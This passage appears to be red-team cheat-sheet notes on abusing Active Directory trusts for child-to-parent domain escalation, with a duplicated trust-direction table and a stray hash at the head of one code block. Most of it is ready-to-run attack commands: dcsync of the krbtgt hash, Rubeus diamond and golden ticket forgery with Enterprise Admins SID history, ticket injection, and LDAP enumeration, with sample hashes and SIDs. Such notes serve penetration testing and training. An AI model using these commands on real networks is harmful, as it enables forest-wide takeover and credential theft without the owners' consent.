
| Value | Trust Direction                 |
| ----- | ------------------------------- |
| 0     | `TRUST_DIRECTION_DISABLED`      |
| 1     | `TRUST_DIRECTION_INBOUND`       |
| 2     | `TRUST_DIRECTION_OUTBOUND`      |
| 3     | `TRUST_DIRECTION_BIDIRECTIONAL` |

| Value | Trust Direction                 |
| ----- | ------------------------------- |
| 0     | `TRUST_DIRECTION_DISABLED`      |
| 1     | `TRUST_DIRECTION_INBOUND`       |
| 2     | `TRUST_DIRECTION_OUTBOUND`      |
| 3     | `TRUST_DIRECTION_BIDIRECTIONAL` |

```powershell
39610acedf7a66db295ee28263e7ad75234ae7884dbde20a4890bf97f7b8872b

execute-assembly ~/opt/Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-1470357062-2280927533-300823338-519 /krbkey:39610acedf7a66db295ee28263e7ad75234ae7884dbde20a4890bf97f7b8872b /nowrap
```
##### Child to Parent Abuse

Enumerate trusts in place
```powershell
ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
```

Obtain krbtgt AES256 hash of the child domain
```powershell
dcsync dublin.contoso.com DUBLIN\krbtgt

ab41d2c550af7cc84b40fd3b69daeab67e1662f7bf662fd1572dd1fa9e949a56
S-1-5-21-2958544638-1589230383-838459903
S-1-5-21-1076548718-1118529210-2193484809
```

Obtain child domain SID and parent domain SID
```powershell
ldapsearch (objectClass=domain) --attributes objectSid

ldapsearch (objectClass=domain) --attributes objectSid --hostname lon-dc-1.contoso.com --dn DC=contoso,DC=com
```

Create diamond ticket (OPSEC SAFE) or a golden ticket offline - `/sids` = child domain
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-2958544638-1589230383-838459903-519 /krbkey:ab41d2c550af7cc84b40fd3b69daeab67e1662f7bf662fd1572dd1fa9e949a56 /nowrap

C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:[Child SID] /sids:[Parent EA GROUP SID] /aes256:[Child KRBTGT HASH] /outfile:C:\Users\Attacker\Desktop\golden
```

Inject ticket into current session
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:

kerberos_ticket_use C:\Users\Attacker\Desktop\[TICKET]
```

Enum
```powershell
ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) *,ntsecuritydescriptor --dn DC=contoso,DC=com
```